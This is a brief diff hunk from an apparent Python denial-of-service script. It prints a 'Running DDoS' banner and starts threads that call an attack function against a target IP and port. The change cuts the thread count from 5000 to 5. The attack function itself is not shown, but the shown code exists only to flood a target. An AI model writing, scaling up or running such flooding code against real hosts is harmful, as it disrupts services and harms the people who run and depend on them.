@@ -35,7 +35,7 @@ print(" ")
 print(f"Running DDoS INTO {ip} {port} !")
 # Start Attack
 
-for i in range(5000):
+for i in range(5):
   t = threading.Thread(target=attack,args=(ip, port), daemon=True)
   t.start()
 while True:
